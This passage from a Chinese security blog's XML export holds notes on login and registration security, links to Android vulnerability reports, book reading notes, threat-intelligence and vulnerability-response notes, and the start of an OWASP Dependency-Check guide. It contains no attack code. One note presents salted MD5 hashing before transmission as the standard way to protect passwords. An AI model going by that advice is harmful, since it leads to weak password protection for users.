<p>token机制的防护原理为：当用户请求注册页面的时候，服务器会给浏览器返回正常的页面和一个隐藏的输入，其中就包含服务器生成的token。token的值是一个服务器生成的字符串。当用户点击提交的时候，这个token会被同时加载到服务器端。服务器得到这个token后，会将从用户端获得的token与当前用户session中保存的token进行比对</p>
</blockquote>
<blockquote>
<p>之后，无论比对结果是否匹配，均立即删除服务器上当前的token，并根据算法重新生成新的token。当用户再次提交的时候，因为找不到对应的token，所以不会重复提交用户的信息。</p>
</blockquote>
<blockquote>
<p>ySQL数据库存在一个特性，即会自动删除参数的前后空格，然后再将其存储入库。</p>
</blockquote>
<blockquote>
<p>阻止批量注册行为通常采用以下的手段。<br>1．对相同用户信息进行注册频率限制<br>（1）单IP注册频率限制</p>
</blockquote>
<blockquote>
<p>（2）表单加验证码</p>
</blockquote>
<p>验证码被绕过后则无法区分</p>
<blockquote>
<p>验证码是有效区分“人”“机器”的重要手段。但是目前各类验证码容易被破解或有打码平台的支持、导致验证码的防护效果不断下降。</p>
</blockquote>
<blockquote>
<p>验证码是有效区分“人”“机器”的重要手段。但是目前各类验证码容易被破解或有打码平台的支持、导致验证码的防护效果不断下降。</p>
</blockquote>
<blockquote>
<p>（3）需要姓名加身份证认证</p>
</blockquote>
<blockquote>
<p>2．采用二次身份校验技术<br>（1）需要验证用户邮箱</p>
</blockquote>
<blockquote>
<p>（2）手机绑定验证</p>
</blockquote>
<blockquote>
<p>但是，综上所述，所有的限制手段的目的均为提升批量注册的难度，但无法从根本上阻止恶意用户，因为系统无法识别用户注册的真实意图。因此从防御视角来看，应尽可能提高恶意注册的难度，使批量注册的成本高于从网站获取到的利益，这样为解决此问题的唯一思路。</p>
</blockquote>
<blockquote>
<p>这种登录页面很常见，而且目前很多站点支持手机APP扫码登录，这样可避免输入用户名及密码，并且能利用手机实现二次验证，能极大提升安全性，推荐大家使用。</p>
</blockquote>
<blockquote>
<p>11.2.1 明文传输用户名&#x2F;密码<br>互联网是开放的，在互联网上传播的任何数据包均可能被截获。对于用户来说，其用户名和密码至关重要，一旦泄漏，用户的身份就能够被其他人直接使用。如果攻击者恶意监听网络通信，并对与目标网站交互的数据包进行分析，那么包中的内容就可能被获取（非HTTPS传输的情况下）。在实际业务中，会带来极大的危害。</p>
</blockquote>
<blockquote>
<p>要解决这个问题，标准方式是在原有密码上添加相应的salt（salt称作盐，也就是一段字符串或特定内容），在利用MD5()计算散列值后进行传输，即可有效提升密码在传输过程中的安全</p>
</blockquote>
<blockquote>
<p>而且，在添加SALT时，不要仅仅利用拼接方式，在实际业务场景下，推荐采用特定位数插入、倒序、定向位数替换等多种方法处理，提升破解难度。</p>
</blockquote>
<blockquote>
<p>当然，HTTPS也不是万能的，这与某些根证书的安全有直接关系。HTTPS解决的是在传输过程中的安全，并不是客户端的安全。</p>
</blockquote>
]]></content>
      <categories>
        <category>Learning</category>
      </categories>
      <tags>
        <tag>Learning</tag>
      </tags>
  </entry>
  <entry>
    <title>Notes-Wooyun安卓漏洞库</title>
    <url>//65272.html</url>
    <content><![CDATA[<h1 id="Pre"><a href="#Pre" class="headerlink" title="Pre:"></a>Pre:</h1><p>对安卓的app漏洞不太熟悉,所以看看一些漏洞类型，做些笔记</p>
<hr>
<h1 id="案例"><a href="#案例" class="headerlink" title="案例:"></a>案例:</h1><h2 id="客户端"><a href="#客户端" class="headerlink" title="客户端:"></a>客户端:</h2><h3 id="设计缺陷-x2F-逻辑错误"><a href="#设计缺陷-x2F-逻辑错误" class="headerlink" title="设计缺陷&#x2F;逻辑错误:"></a>设计缺陷&#x2F;逻辑错误:</h3><ul>
<li><p><a href="https://wooyun.x10sec.org/static/bugs/wooyun-2016-0190106.html">金山词霸安卓app越权问题（signature算法太弱轻松破解）</a></p>
<p>  登录后每一个数据包都带signature字段，没有cookie和session认证，那么破解signature后就能自己组包生成signature了，以达到越权的目的。</p>
<blockquote>
<p>前段时间也遇到过,app对每个数据包做签名,导致无法进行篡改.</p>
</blockquote>
</li>
<li><p><a href="https://wooyun.x10sec.org/static/bugs/wooyun-2015-0132255.html">聚美优品安卓客户端组件暴露可实现钓鱼</a></p>
</li>
<li><p><a href="https://wooyun.x10sec.org/static/bugs/wooyun-2015-0135403.html">去哪儿安卓客户端组件暴露可实现钓鱼</a></p>
<p>  由于组件暴露问题，第三方应用可以启动应用<br>  这2个应该是看manifest文件<br>  TODOTODO</p>
</li>
</ul>
<hr>
<h3 id="非授权访问-x2F-认证绕过"><a href="#非授权访问-x2F-认证绕过" class="headerlink" title="非授权访问&#x2F;认证绕过:"></a>非授权访问&#x2F;认证绕过:</h3><ul>
<li><p><a href="https://wooyun.x10sec.org/static/bugs/wooyun-2015-0148550.html">91金融安卓APP客户端升级过程存在缺陷可被中间人攻击利用植入木马</a></p>
<p>  拦截回包,修改更新包的地址<br>  升级过程存在缺陷，，校验过程不严格，可被中间人攻击利用植入木马</p>
</li>
</ul>
<hr>
<h3 id="远程代码执行"><a href="#远程代码执行" class="headerlink" title="远程代码执行"></a>远程代码执行</h3><ul>
<li><p><a href="https://wooyun.x10sec.org/static/bugs/wooyun-2016-0188311.html">巴士管家安卓app远程代码执行</a></p>
</li>
<li><p>[]</p>
<p>  TODOTODO</p>
</li>
</ul>
<hr>
<h2 id="服务端"><a href="#服务端" class="headerlink" title="服务端:"></a>服务端:</h2><ul>
<li><a href="https://wooyun.x10sec.org/static/bugs/wooyun-2016-0172231.html">漫画岛安卓app服务器SQL注入</a></li>
</ul>
]]></content>
      <categories>
        <category>AndroidSecurity</category>
      </categories>
      <tags>
        <tag>AndroidSecurity</tag>
      </tags>
  </entry>
  <entry>
    <title>Notes-代码之外的功夫:程序员精进之路读后感(上)</title>
    <url>//52437.html</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><blockquote>
<p>但最重要的是，你要注意比较真实的自己和我为你设定的角色，寻找其中的共同点和值得深究的不同点。</p>
</blockquote>
<blockquote>
<p>由于<strong>软件开发人员的职业发展路线更像是螺旋线而非直线</strong>，因此无论你现在处于哪个阶段，我都建议你通读所有章节。</p>
</blockquote>
<p>软件开发人员的职业发展路线更像是螺旋线而非直线，学习的路线也是如此.</p>
<p>速度并非是匀速的,从0到1是能成长得很快,但是到了后面就需要更多的耐心，更多的反馈,才能继续进步.</p>
<hr>
<h1 id="第1章-善用设计原型，探索项目创意"><a href="#第1章-善用设计原型，探索项目创意" class="headerlink" title="第1章 善用设计原型，探索项目创意"></a>第1章 善用设计原型，探索项目创意</h1><blockquote>
<p><strong>再简单的软件系统也是由很多活动的组件构成的</strong>，所以在设计的早期阶段就让它运转起来，看看组件之间的相互作用，是很有好处的。</p>
</blockquote>
<p>初期不要追求太完美,最主要让项目能run起来.<br>Done is better than perfect.</p>
<hr>
<h2 id="1-2-利用线框图表达功能需求"><a href="#1-2-利用线框图表达功能需求" class="headerlink" title="1.2 利用线框图表达功能需求"></a>1.2 利用线框图表达功能需求</h2><blockquote>
<p>弄清楚几个<strong>整体性问题</strong>之后，你把注意力转回到方法论上来：如何开始项目的第一轮开发。通常在这一阶段，绘制线框图非常有帮助。你可以<strong>通过线框图向大家解释待开发应用的基本结构</strong>，同时让大家都了解需要完成什么工作，<strong>以免因过度关注技术细节而迷失了大方向</strong>。</p>
</blockquote>
<p>我的开发习惯是会在开始编码前会画大量的图,一年下来草稿本至少用掉两三本.</p>
<p>之前在看《一的力量》这本小说有提到一句话让我印象深刻,<strong>先用脑，再用心。</strong>.</p>
<p>开发一个功能也是,真正意义上编写代码的时间并不长。</p>
<p>前期构思清楚了,后面写起来也会特别顺手,无非就是把功能用某种特定的编程语言写出来而已。</p>
<p>保留的草稿图在后面给别人讲解你的功能的时候,也更方便.</p>
<p>不会一开始就让别人陷入你的实际代码,陷入那些琐碎的细节中,而能有个整体的观感,更容易让人理解.</p>
<blockquote>
<p>你建议不要花费过长时间去讨论推荐系统的实现方式，而应该<strong>先集中精力寻找“最简单可行的方法”</strong>。</p>
</blockquote>
<p>初期，可行是很重要的.</p>
<p>在这过程中也是需要进行必要的可行性分析.</p>
<hr>
<h2 id="1-3-编程之初立即搭建测试系统"><a href="#1-3-编程之初立即搭建测试系统" class="headerlink" title="1.3 编程之初立即搭建测试系统"></a>1.3 编程之初立即搭建测试系统</h2><blockquote>
<p>原型法的意义是拉近项目中每个参与者之间的距离：不仅是开发人员和客户之间，也包括客户和用户之间.</p>
</blockquote>
<blockquote>
<p><strong>第一次发布的真正目的是创建一个可用的系统，以便提高后续的变更速度，</strong>并由此开始探索项目创意的过程。从现在开始，客户可以直接和你编写的软件交互，这将大大提高你的开发速度。</p>
</blockquote>
<p>编写开源项目也是有这种感受.</p>
<p>你初次把成型的的项目开源出来后,如果有满足一部分的需求,大家觉得还不错,他们就会去使用.</p>
<p>然后他们会提issue给你反馈,他们提出的问题确实是能够大大提高项目的开发进度,也会给你激励.</p>
<p>反馈在项目开发和学习的过程中,是特别重要的。</p>
<hr>
<h2 id="1-4-全面探讨不足，改善追求实效"><a href="#1-4-全面探讨不足，改善追求实效" class="headerlink" title="1.4 全面探讨不足，改善追求实效"></a>1.4 全面探讨不足，改善追求实效</h2><blockquote>
<p>完全不犯错误是不可能的，但最关键的是你对这些问题作何反应。</p>
</blockquote>
<blockquote>
<p>每当发现自己的软件有瑕疵时，你可能想要停下手中的工作，立即去修复。但是在项目的探索阶段，你得去平衡软件缺陷带来的损失和修复这一缺陷的时间成本。</p>
</blockquote>
<p>如果有些不是特别重要的bug，为了平衡整体的开发进度是可以选择忽略的。</p>
<p>比如一些特定的比较极端的情况下才会出现的bug.</p>
<hr>
<h2 id="1-5-早问多问，验证设想"><a href="#1-5-早问多问，验证设想" class="headerlink" title="1.5 早问多问，验证设想"></a>1.5 早问多问，验证设想</h2><blockquote>
<p>不过，验证对这种事情的设想总是有好处的，而且越早验证越好。</p>
</blockquote>
<blockquote>
<p>早问总比晚问好。所谓“学之乃知，不问不识”，多问问总不会有坏处！</p>
</blockquote>
<p>越早验证,可能能告诉你项目的能力的边界.</p>
<p>或者说先提前多用搜索,看看别人的解决方案,很多时候是能省下很多宝贵的时间的.</p>
<hr>
<h2 id="1-6-力求缩小自己的工作范围"><a href="#1-6-力求缩小自己的工作范围" class="headerlink" title="1.6 力求缩小自己的工作范围"></a>1.6 力求缩小自己的工作范围</h2><blockquote>
<p>经典问题：“<strong>最简单可行的方法是什么？</strong>”</p>
</blockquote>
<blockquote>
<p><strong>第一天所做的大部分工作是搭建一个基本框架，因此接下来的开发工作就会变得相对容易</strong>。你可以在这个已有的框架中发掘真正的问题，并试着去解决。如果一开始就直接考虑整个问题怎么解决，你就会很难找到一个切入点，这样停滞的时间就会更长。</p>
</blockquote>
<p>可以先搭建一个初步的框架,如果运气比较好的话,这个框架的设计出来的可拓展性比较好的话,后面在拓展和增强的时候，是可以带来不少的惊喜的.</p>
<hr>
<h2 id="1-8-巧妙设计特性，轻松收集反馈"><a href="#1-8-巧妙设计特性，轻松收集反馈" class="headerlink" title="1.8 巧妙设计特性，轻松收集反馈"></a>1.8 巧妙设计特性，轻松收集反馈</h2><blockquote>
<p>想要做到张弛有度，知道什么时候该快、什么时候该细，是需要经验的。</p>
</blockquote>
<p>这很多时候需要有经验的开发人员去把握项目的整体进度.</p>
<blockquote>
<p>俗话说“细节决定成败”，随后的几次迭代会涉及更多细节。在原型阶段结束之前，应该至少会有一个始料未及的重大问题浮出水面。</p>
</blockquote>
<p>如果项目不是特别紧的话，有时候是要给项目的某个功能开发预留多一些时间.避免出现大的问题后,因为预留的时间不够,然后手忙脚乱的。</p>
<blockquote>
<p>但出现这样的情况并不意味着开发过程有问题，你恰恰应该做好准备面对反馈环的加速所产生的这一副作用。原型可以帮助你更快地做出有用的产品，但也可能让你失败得更快。如果不用花太多时间就能辨认出死胡同，那你就有更多的时间和精力去寻找正确的路。</p>
</blockquote>
<p>失败有时候是在所难免的,但是能快速试错也是不错的.</p>
<blockquote>
<p>在项目早期建立起一些诚意和信任，可以给人一种动力，让人在啃到任何创新工作都无法避免的“硬骨头”时，能够坚持下去。</p>
</blockquote>
<h2 id="忠告与提醒"><a href="#忠告与提醒" class="headerlink" title="忠告与提醒"></a>忠告与提醒</h2><blockquote>
<ul>
<li>多向项目参与者提一些能够发掘其目标的问题。这样一来，你既可以验证自己的想法，又可以更好地了解他人对问题的看法。</li>
<li>绘制线框图（草图）可以清晰地和他人探讨应用的结构，不会因为被样式细节绊住而停滞不前。</li>
<li>一定要在一开始写代码的时候就搭建一个测试系统，让大家都能与其交互。测试系统不需要完善到满足上线要求，只要适合收集有用的反馈即可。</li>
<li>在项目早期，集中精力解决有风险或未知的问题。建立原型是为了探索问题空间，而不是为了做出完整的产品。</li>
</ul>
</blockquote>
<hr>
<h1 id="第2章"><a href="#第2章" class="headerlink" title="第2章"></a>第2章</h1><h2 id="2-1-不存在所谓的“独立特性”"><a href="#2-1-不存在所谓的“独立特性”" class="headerlink" title="2.1 不存在所谓的“独立特性”"></a>2.1 不存在所谓的“独立特性”</h2><blockquote>
<p>在这些想法的启发下，你用了几个步骤来降低风险。这几个步骤其实并不怎么复杂，但是可以帮助你避免严重灾难。</p>
</blockquote>
<blockquote>
<p>· 你把最大页数限定为不超过1000个文档。<br>· 你把每个维基页面的大小限定为不超过500KB。<br>· 你把维基系统的Markdown进程放到一个队列里，并把队列大小设置为不超过20个挂起任务。当队列过载时，会发出“请重试”的出错信息。<br>· 你加入了监听器，以便监管维基页面的创建、删除和编辑。这些操作发生得太频繁时，系统会发出警告。<br>· 你为知识库网站加入了有效性监管机制，每分钟进行两次ping操作，以保证网站一直能够有效访问，并在可接受的时间范围内响应请求。这项工作本应该在很久之前就做好，但现在由于对改良监管机制有明确的需求，因此这时候做再合适不过了。<br><strong>这些方法本身并不足以保证系统绝对安全。然而，花上大约一小时，预防一下由共享基础设施引发的最基本的风险，是非常值得的</strong>。</p>
</blockquote>
<p>在项目周期紧的时候,确实是不能很全面的考虑到安全的问题.</p>
<p>但是如果是有一些安全基础的开发人员,是能在一些功能开发前就能get到有可能会遇到哪些安全问题.</p>
<p>可能这也是做安全的去做开发时的优势吧。</p>
<hr>
<h2 id="2-2-两特性同屏必相互依赖"><a href="#2-2-两特性同屏必相互依赖" class="headerlink" title="2.2 两特性同屏必相互依赖"></a>2.2 两特性同屏必相互依赖</h2><blockquote>
<p>在告诉Sandi这些想法之前，你决定先快速分析一下，看看自己在当前的情况下能做到什么程度。</p>
</blockquote>
<blockquote>
<p>但实际上，你知道<strong>根本没有零风险的事</strong>。</p>
</blockquote>
<blockquote>
<p>你应该从这次失败中学到的是，对数据库模式所做的任何修改都应该考虑到数据的一致性。<strong>不管新特性在代码层面上多么独立，在数据层面上仍有可能存在隐藏的依赖关系</strong>。这就意味着，为了支持某一特性而在代码库的某一部分进行的模式升级，可能会使一些看起来毫无关系的其他特性崩溃——这正是你所遇到的情况。</p>
</blockquote>
<p>之前仅仅是给了一个扫描功能多加了一个超时的参数,没想到后面会牵连出很多个bug..</p>
<p>还是自己 too young too simple…</p>
<hr>
<h2 id="2-3-避免不必要的实时数据同步"><a href="#2-3-避免不必要的实时数据同步" class="headerlink" title="2.3 避免不必要的实时数据同步"></a>2.3 避免不必要的实时数据同步</h2><blockquote>
<p>同时，你也避免了向主站应用添加新的设置信息或库，因为脚本是独立运行的，并且只在数据库层与主站应用共享信息。</p>
</blockquote>
<p>高内聚低耦合这个思想还是很重要的.只有把模块设计得足够独立,在后面的测试,编写,拓展以及修改时，会清晰许多.</p>
<hr>
<h2 id="2-4-复用旧代码，寻找新问题"><a href="#2-4-复用旧代码，寻找新问题" class="headerlink" title="2.4 复用旧代码，寻找新问题"></a>2.4 复用旧代码，寻找新问题</h2><blockquote>
<p>渡过最大的危机之后，你开始分析该问题的根本原因：让一小部分受信任的管理员使用Markdown处理器没有问题，但在充斥着大量自动化程序的互联网环境下，这种机制很不安全。</p>
</blockquote>
<blockquote>
<p>从根源上讲，这其实也是一个依赖问题。你复用了一个为某种目的而合理设置的工具，但并没有考虑到在稍有不同的情况下，这种设置可能会产生不良影响。你这样做时，<strong>只考虑到两种使用环境表面上的相似性，而忽略了二者本质上的不同。这使你被表象迷惑，从而做出了错误的判断。</strong>这是一个复用代码的反面例子，值得引以为戒。</p>
</blockquote>
<blockquote>
<p>毫无疑问，必须处理潜在的安全风险。防止匿名访问者向维基页面随意注入JavaScript代码，是非常有必要的。但是，你也需要把因修复而带来的负面影响降到最低。</p>
</blockquote>
<blockquote>
<p>为了确保以后这样的情况不会神不知鬼不觉地发生，你用余下的整个下午写了一些测试代码，把所有能想到的极端情况都测试了一遍</p>
</blockquote>
<p>测试很重要.简单的测试只能保证你的程序没有大的问题,但是很多边界的情况是需要在不同的环境下进行大量的测试的.</p>
<p>之前我们开发团队就忽略了这个问题,没有尽可能的进行大量的测试,导致程序很脆弱,在新的客户环境下一跑就出错..哈哈哈..</p>
<hr>
<h2 id="忠告与提醒-1"><a href="#忠告与提醒-1" class="headerlink" title="忠告与提醒"></a>忠告与提醒</h2><blockquote>
<ul>
<li>不要因为某个变更没有明显改变现有特性，就认为它会向后兼容或绝对安全。相反，应该对隐藏的依赖关系随时保持警惕，即使进行的是最简单的更新操作。</li>
<li>注意除代码库之外的大量共享资源：存储机制、处理能力、数据库、外部服务、库、用户界面，等等。这些工具形成了一张“隐藏依赖网”，会给看起来毫无关联的应用特性带来副作用或引起故障。</li>
<li>利用限制和验证的方式，在最大程度上防止局部故障对整个系统造成影响。但还要确保系统拥有良好的监控机制，以保证快速知晓和处理突如其来的系统故障。</li>
</ul>
</blockquote>
<p>log或者程序监控是很重要,如果出了问题,那么这个问题就第一时间在监控中找到.</p>
<blockquote>
<ul>
<li>在复用现有的工具和资源时，要尤其注意使用环境的变化。任何对使用范围、性能标准或隐私安全级别的改变，如果不经过仔细考虑，都可能引起非常危险的问题。</li>
</ul>
</blockquote>
<p>之前我编写的扫描器并没有在其他环境比如wins下测试过,别人在wins下跑了会出问题,我才意识到自己编写的程序欠缺这方面的考虑,也感觉到了维护一个开源项目确实是挺不容易的.</p>
]]></content>
      <categories>
        <category>Learning</category>
      </categories>
      <tags>
        <tag>Learning</tag>
      </tags>
  </entry>
  <entry>
    <title>Notes-安全应急响应中心之威胁情报探索—JSRC-2</title>
    <url>//46109.html</url>
    <content><![CDATA[<h2 id="威胁情报和漏洞的区别"><a href="#威胁情报和漏洞的区别" class="headerlink" title="威胁情报和漏洞的区别:"></a>威胁情报和漏洞的区别:</h2><p>漏洞的概念较明确，而情报比较宽泛。</p>
<p>威胁情报并不是虚的。 其中存在假情报和难追溯的情报。</p>
<p><strong>情报一般分为线索和事件:</strong></p>
<p>我上报了一个黑客组织，可以作为<strong>线索</strong>；</p>
<p>公司根据这个线索发现了之前一个案子和他们有关，就可能引申出一个<strong>事件</strong>。</p>
<p>威胁情报并不一定是提前预知</p>
<p>作为甲方公司，很多已经发生的漏洞利用资金损失，我们也有很多没有发现的，这些也都是情报。</p>
<p><strong>情报分技术型情报和业务型情报</strong></p>
<p>漏洞属于技术型情报。有的情报很全，有的只能算是线索。</p>
<p>业务型的最难判定，我们这边也分两个维度，<strong>危害维度</strong>和<strong>完整度维度</strong>。</p>
<hr>
<h2 id="获取情报的来源渠道"><a href="#获取情报的来源渠道" class="headerlink" title="获取情报的来源渠道:"></a>获取情报的来源渠道:</h2><p>这个看业务了。</p>
<p>举个栗子，有的白帽子已经成功混迹在高端游戏玩家群里，黑产卖异常装备的时候，就来举报。</p>
<p>比较聪明的同学，会<strong>关注黑产变现的渠道</strong>。</p>
<blockquote>
<p>whole chain</p>
</blockquote>
<hr>
<h2 id="暂时没用的线索"><a href="#暂时没用的线索" class="headerlink" title="暂时没用的线索:"></a>暂时没用的线索:</h2><p>如果一条线索过来了，只是证明存在但不能做什么事。这种对于平台来说是不是一种成本浪费？</p>
<p><strong>溯源是一种能力，线索是一种沉淀。</strong></p>
<p>被证明有价值的情报，是一种线索沉淀，不会是浪费的。</p>
<p>安全行业内，不管是漏洞还是情报，都是要不断求证的。</p>
<p>只要<strong>投入产出比可控</strong>即可。</p>
<p>这其实也是一个二八原则。</p>
<p>此外，没有产生价值的，可能只是当前没有产生价值，后面业务变化了，可能就会产生相应价值。</p>
<hr>
<h2 id="建立威胁情报的目的"><a href="#建立威胁情报的目的" class="headerlink" title="建立威胁情报的目的:"></a>建立威胁情报的目的:</h2><p>无疑是<strong>为了预知未来的风险</strong>！</p>
<p>个人认为，威胁情报对于各公司来说可以把<strong>风险感知再次往前提</strong>，能够通过各渠道来源，分析后续的破坏行为。</p>
<hr>
<h2 id="威胁情报的评定指标"><a href="#威胁情报的评定指标" class="headerlink" title="威胁情报的评定指标:"></a>威胁情报的评定指标:</h2><p>主要看<strong>情报的详细程度和对业务的影响</strong>，来评定情报的等级。</p>
<p>不过低价值的情报分值不高。大致是看详细程度、涉及业务、目前和潜在的影响.</p>
<p>有一条就是基于漏洞的情报，不会比按漏洞标准评定低就是了。</p>
<p>目前来看提交者比较理性，大都是遇到事件了来提交，线索其实没那么多。</p>
<p>不同公司关注的情报不一样，建议大家在看情报的时候，先看看这个公司关注什么，根据公司实际业务多磨合磨合。</p>
<hr>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结:"></a>总结:</h2><ul>
<li><p>情报一般分为线索和事件:</p>
<ul>
<li>我上报了一个黑客组织，可以作为<strong>线索</strong>；</li>
<li>公司根据这个线索发现了之前一个案子和他们有关，就可能引申出一个<strong>事件</strong>。</li>
</ul>
</li>
<li><p>对于暂时没用的线索:</p>
<ul>
<li><strong>溯源是一种能力，线索是一种沉淀。</strong></li>
<li>被证明有价值的情报，是一种线索沉淀，不会是浪费的。</li>
<li>安全行业内，不管是漏洞还是情报，都是要不断求证的。只要<strong>投入产出比可控</strong>即可。</li>
</ul>
</li>
<li><p>威胁情报的评定指标:</p>
<ul>
<li>主要看<strong>情报的详细程度和对业务的影响</strong>，来评定情报的等级。</li>
</ul>
</li>
<li><p>获取情报的来源渠道:</p>
<ul>
<li>可重点关注<strong>黑产变现的渠道</strong></li>
</ul>
</li>
<li><p>建立威胁情报的目的:</p>
<ul>
<li>预知未来的风险</li>
<li>风险感知再次往前提</li>
</ul>
</li>
</ul>
<hr>
<h1 id="refs"><a href="#refs" class="headerlink" title="refs:"></a>refs:</h1><ul>
<li><a href="https://github.com/xiangpasama/JDSRC-Small-Classroom/blob/master/02-%E5%AE%89%E5%85%A8%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E4%B8%AD%E5%BF%83%E4%B9%8B%E5%A8%81%E8%83%81%E6%83%85%E6%8A%A5%E6%8E%A2%E7%B4%A2.pdf">安全应急响应中心之威胁情报探索</a></li>
</ul>
]]></content>
      <categories>
        <category>Security</category>
      </categories>
      <tags>
        <tag>Security</tag>
      </tags>
  </entry>
  <entry>
    <title>Notes-论安全漏洞响应机制扩展—JSRC-3</title>
    <url>//20063.html</url>
    <content><![CDATA[<h2 id="如何看待待企业的安全工作建设"><a href="#如何看待待企业的安全工作建设" class="headerlink" title="如何看待待企业的安全工作建设"></a>如何看待待企业的安全工作建设</h2><p>安全响应中心不仅仅是接报漏洞，还需要帮助内部提升安全质量，分为两方面：被动、主动。</p>
<p>被动方面:</p>
<p>比如说进行针对性的培训，加强规范。 <strong>需要明确的是，安全团队是在帮助业务部门防范风险；</strong></p>
<p>主动方面:</p>
<p>应该是我们增加的那些检测机制，例如在上线流程，或waf中增加策略，可以直接进行自动化检测。</p>
<p>漏洞的处理是一个方面，对于内部的项目上线筛查可能比后续更重要，通过需求评审， 架构评审，安全评审等来筛选项目是否够上线的条件。</p>
<p>上线前充分筛查，上线后出现问题，基本都可控。</p>
<blockquote>
<p>现状是,还会发现一些在野资产。都不知道什么时候就上线了。</p>
</blockquote>
<p>另外，上线流程过程中可以开发一些黑盒、白盒扫描工具，提供给开发人员，让开发人员去自查，如果有问题再找安全部门，这样开发人员也会对安全越来越了解。只要解决开发部门的自我驱动，所有问题都迎刃而解。</p>
<blockquote>
<p>让开发人员自查,这个难度有点大</p>
</blockquote>
<hr>
<h2 id="安全响应机制整个流程的结束点？"><a href="#安全响应机制整个流程的结束点？" class="headerlink" title="安全响应机制整个流程的结束点？"></a>安全响应机制整个流程的结束点？</h2><p>白帽子提交漏洞，<strong>企业应该按照白帽子提供的方法结合自己的业务去查是否还有类似的问题，白帽子的漏洞提交只是事件处理的开始。处理完相同类型的漏洞，才能算是结束。</strong></p>
<blockquote>
<p>举一反三, 一个地方有问题，那么其他地方出现同样问题的概率很大。</p>
</blockquote>
<hr>
<h2 id="跨部门协作配合修复漏洞的问题"><a href="#跨部门协作配合修复漏洞的问题" class="headerlink" title="跨部门协作配合修复漏洞的问题:"></a>跨部门协作配合修复漏洞的问题:</h2><p>有些漏洞不一定能及时修复,但这不会影响我们对漏洞的评级。 </p>
<p>在企业中，越大的企业越会出现漏洞修复推进困难的情况。</p>
<blockquote>
<p>漏洞的修复情况,看这几个因素:</p>
<ol>
<li>具体的漏洞</li>
<li>这个漏洞会影响的业务</li>
<li>业务方的配合程度</li>
<li>有没有合适贴切的解决方案</li>
</ol>
</blockquote>
<p>“提升安全能力”不在应急止损的关注范围内，可以包括在后续安全建设中。 跨部门修复方面主要分 <strong>“产品线重视自觉寻求帮助”</strong> 和 <strong>“上级推动”</strong> 两类。</p>
<p>定制漏洞修复事件dead line，如果不修，逐级上报。</p>
<p>还可制定不同级别漏洞对应不同修复时间的要求， 严格执行考核。 超期系统自动邮件抄处理人的上一级领导， 时间越长，抄送级别越高，直到超送到技术副总裁。</p>
<hr>
<h2 id="一个业务部门如果多次出现同类型问题，-有相应的响应机制么？"><a href="#一个业务部门如果多次出现同类型问题，-有相应的响应机制么？" class="headerlink" title="一个业务部门如果多次出现同类型问题， 有相应的响应机制么？"></a>一个业务部门如果多次出现同类型问题， 有相应的响应机制么？</h2><p>需要看是什么类型问题，是工作态度问题还是技术能力不够，如果是前者要找他们leader去沟通，如果是后者，安全部门需要组织交流培训，提升业务部门的安全意识和技术能力。</p>
<hr>
<h2 id="安全应急响应机制"><a href="#安全应急响应机制" class="headerlink" title="安全应急响应机制:"></a>安全应急响应机制:</h2><p>建立安全接口人，协助产品线培养免疫力。</p>
<p>阶梯性的做安全培训，后续让产品线他们自己重视培训，提升安全意识与能力。</p>
<hr>
<h1 id="refs"><a href="#refs" class="headerlink" title="refs:"></a>refs:</h1><ul>
<li><a href="https://github.com/xiangpasama/JDSRC-Small-Classroom/blob/master/03-%E8%AE%BA%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E%E5%93%8D%E5%BA%94%E6%9C%BA%E5%88%B6%E6%89%A9%E5%B1%95.pdf">论安全漏洞响应机制扩展</a></li>
</ul>
]]></content>
      <categories>
        <category>Security</category>
      </categories>
      <tags>
        <tag>Security</tag>
      </tags>
  </entry>
  <entry>
    <title>OWASP-Dependency-Check的使用与结果解析</title>
    <url>//19075.html</url>
    <content><![CDATA[<h1 id="Pre"><a href="#Pre" class="headerlink" title="Pre:"></a>Pre:</h1><p>SDL中使用到<code>Dependency-Check</code>工具对源代码的第三方依赖库进行扫描。</p>
<hr>
<h1 id="简介"><a href="#简介" class="headerlink" title="简介:"></a>简介:</h1><p>OWASP是开源的、非盈利的全球性安全组织，致力于应用软件的安全研究。OWASP的使命是使应用软件更加安全，使企业和组织能够对应用安全风险作出更清晰的决策。</p>
<p>OWASP的研究成果被美、欧、日等多个国家的32个政府与行业组织机构引用成为近百项国际法规、标准、指南和行业行为准则。</p>
<p>Dependency-Check是OWASP（Open Web Application Security Project）的一个实用开源程序，用于识别项目依赖项并检查是否存在任何已知的，公开披露的漏洞。</p>
<p>目前，已支持<code>Java</code>、<code>.NET</code>、<code>Ruby</code>、<code>PHP</code>、<code>Node.js</code>、<code>Python</code>等语言编写的程序，并为<code>C/C++</code>构建系统（autoconf和cmake）提供了有限的支持。而且该工具还是OWASP Top 10的解决方案的一部分。</p>
<p>Dependency-Check支持面广（支持多种语言）、可集成性强，作为一款开源工具，在多年来的发展中已经支持和许多主流的软件进行集成，比如：命令行、Ant、Maven、Gradle、Jenkins、Sonar等；具备使用方便，落地简单等优势。</p>
<hr>
<h1 id="实现原理"><a href="#实现原理" class="headerlink" title="实现原理:"></a>实现原理:</h1><p>依赖性检查可用于扫描应用程序（及其依赖库），执行检查时会将 <code>Common Platform Enumeration (CPE)</code>美国国家漏洞数据库及<code>NPM Public Advisories</code>库下载到本地，再通过核心引擎中的一系列分析器检查项目依赖性，收集有关依赖项的信息，然后根据收集的依赖项信息与本地的CPE&amp;NPM库数据进行对比，如果检查发现扫描的组件存在已知的易受攻击的漏洞则标识，最后生成报告进行展示。</p>
<hr>
<h1 id="命令参数"><a href="#命令参数" class="headerlink" title="命令参数:"></a>命令参数:</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">.\dependency-check.bat --<span class="built_in">help</span></span><br><span class="line"></span><br><span class="line">usage: Dependency-Check Core [--advancedHelp] [--enableExperimental]</span><br><span class="line">       [--exclude &lt;pattern&gt;] [-f &lt;format&gt;] [--failOnCVSS &lt;score&gt;] [-h]</span><br><span class="line">       [--junitFailOnCVSS &lt;score&gt;] [-l &lt;file&gt;] [-n] [-o &lt;path&gt;]</span><br><span class="line">       [--prettyPrint] [--project &lt;name&gt;] [-s &lt;path&gt;] [--suppression</span><br><span class="line">       &lt;file&gt;] [-v]</span><br><span class="line"></span><br><span class="line">Dependency-Check Core can be used to identify <span class="keyword">if</span> there are any known CVE</span><br><span class="line">vulnerabilities <span class="keyword">in</span> libraries utilized by an application. Dependency-Check</span><br><span class="line">Core will automatically update required data from the Internet, such as</span><br><span 